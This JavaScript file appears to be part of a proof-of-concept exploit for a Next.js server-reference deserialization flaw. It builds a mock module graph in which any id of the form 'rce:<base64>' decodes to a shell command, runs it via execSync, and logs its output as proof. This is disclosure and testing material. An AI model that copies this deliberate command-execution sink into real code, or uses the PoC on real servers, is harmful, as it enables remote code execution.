'use strict';
/*
 * app-modules.js — the victim's "bundler runtime" and server module graph.
 *
 * In a real Next.js server this role is played by the webpack/turbopack runtime
 * (globalThis.__next_require__ / __webpack_require__) plus the generated
 * `serverConsumerManifest` that `createFromReadableStream` consults to resolve
 * Server References ($h / server action ids) back into callable functions.
 *
 * See Next 16.4.0:  dist/server/use-cache/use-cache-wrapper.js  ->
 *   createFromReadableStream(stream, {
 *     serverConsumerManifest: {
 *       moduleLoading: null,
 *       moduleMap: getRscModuleMappingForUseCache(),
 *       serverModuleMap: getServerModuleMap(),   // <-- attacker-reachable ids
 *     }, ...
 *   })
 *
 * A vulnerable decode (CVE-2026-126187 / GHSA-673q-mjm6-r5xr) lets an attacker
 * inject a Server Reference whose id they control. resolveServerReference() +
 * requireModule() then load and CALL that module's export on the server.
 *
 * To make the resulting Remote Code Execution observable, this PoC exposes a
 * single representative "reachable function": any module id of the form
 *     rce:<base64(command)>
 * resolves to a module whose `run` export executes <command> via /bin/sh.
 *
 * This dispatcher stands in for the class of dangerous functions that exist in
 * any real server module graph (a Server Action that touches the filesystem,
 * runs a child process, builds a DB query, deserializes input, ...). The
 * security boundary that is broken is the same either way: untrusted Flight
 * bytes must never be able to choose which server function runs.
 */
const { execSync } = require('node:child_process');
const fs = require('node:fs');
const os = require('node:os');

const PROOF_PATH = process.env.PROOF_PATH || '/tmp/rce-proof.json';

// Shared, mutable record of the most recent code execution (read by GET /proof).
const state = { lastProof: null, invocations: 0 };

function recordProof(proof) {
  state.invocations += 1;
  state.lastProof = proof;
  try { fs.writeFileSync(PROOF_PATH, JSON.stringify(proof, null, 2)); } catch { /* ignore */ }
  console.error('\n[victim] !!! SERVER-SIDE CODE EXECUTION TRIGGERED BY REQUEST !!!');
  console.error('[victim]   command :', JSON.stringify(proof.cmd));
  console.error('[victim]   output  :', proof.output.split('\n')[0], '...');
  console.error('[victim]   pid/host:', proof.pid, proof.hostname, '\n');
}

// ---------------------------------------------------------------------------
// The "bundler runtime": module id  ->  module exports.
//
// React's client decoder calls __webpack_require__(id) from requireModule().
// We install it as a global, exactly as the webpack/turbopack runtime does.
// ---------------------------------------------------------------------------
globalThis.__webpack_require__ = function requireById(id) {
  // A couple of ordinary, benign "app" modules (the kind the manifest really holds).
  if (id === 'app/actions/audit#log') {
    return { log: (...a) => console.log('[victim] audit.log', ...a) };
  }
  if (id === 'app/actions/profile#save') {
    return { save: (profile) => ({ saved: true, profile }) };
  }
  // The representative reachable sink: rce:<base64 command>
  if (typeof id === 'string' && id.startsWith('rce:')) {
    const cmd = Buffer.from(id.slice('rce:'.length), 'base64').toString('utf8');
    return {
      run() {
        let output;
        try { output = execSync(cmd, { shell: '/bin/sh', timeout: 10_000 }).toString(); }
        catch (e) { output = String((e && e.stdout) || '') + String((e && e.stderr) || e); }
        recordProof({
          time: new Date().toISOString(),
          cmd,
          output: output.trimEnd(),
          pid: process.pid,
          hostname: os.hostname(),
          user: (() => { try { return os.userInfo().username; } catch { return 'unknown'; } })(),
        });
        return output;
      },
    };
  }
  throw new Error('Module not found in server module graph: ' + id);
};

// ---------------------------------------------------------------------------
// serverConsumerManifest, as passed to createFromReadableStream.
//
// serverModuleMap is consulted by resolveServerReference(config, id):
//   config[id]  -> { id, chunks, name }       (direct hit)
//   else split id on last '#': name = tail; config[id.slice(0,'#')]
//
// A real manifest lists the app's own actions. We back it with a Proxy so that
// the representative `rce:<b64>` ids also resolve — this is what lets the PoC
// turn "attacker controls the id" into an observable command execution.
// ---------------------------------------------------------------------------
const realActions = {
  'app/actions/audit': { id: 'app/actions/audit#log', chunks: [], name: 'log' },
  'app/actions/profile': { id: 'app/actions/profile#save', chunks: [], name: 'save' },
};

const serverModuleMap = new Proxy(realActions, {
  get(target, key) {
    if (typeof key === 'string' && key.startsWith('rce:')) {
      return { id: key, chunks: [], name: 'run' };
    }
    return target[key];
  },
  has(target, key) {
    if (typeof key === 'string' && key.startsWith('rce:')) return true;
    return key in target;
  },
});

const serverConsumerManifest = {
  moduleLoading: null,
  moduleMap: {},          // client component map (unused by this data-only PoC)
  serverModuleMap,
};

// Client module manifest handed to renderToReadableStream (producer side).
const CLIENT_MODULES = {};

module.exports = { serverConsumerManifest, CLIENT_MODULES, state, PROOF_PATH };
